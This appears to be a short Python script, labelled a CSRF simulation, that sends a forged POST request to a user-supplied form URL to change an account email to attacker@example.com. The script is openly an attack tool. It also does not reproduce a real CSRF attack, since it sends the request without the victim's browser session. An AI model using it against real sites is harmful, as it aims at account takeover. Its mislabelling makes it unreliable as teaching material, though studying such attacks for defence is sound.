import requests

def simulate_csrf(url, data):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        print(f"[+] Sending forged request to: {url}")
        response = requests.post(url, data=data, headers=headers)
        print(f"[+] Status Code: {response.status_code}")
        print("[+] Response:")
        print(response.text[:300])
    except requests.exceptions.RequestException as e:
        print("[!] Error:", e)

if __name__ == "__main__":
    target_url = input("Enter the target form URL (e.g., http://example.com/change_email): ")
    forged_data = {
        "email": "attacker@example.com"
    }
    simulate_csrf(target_url, forged_data)
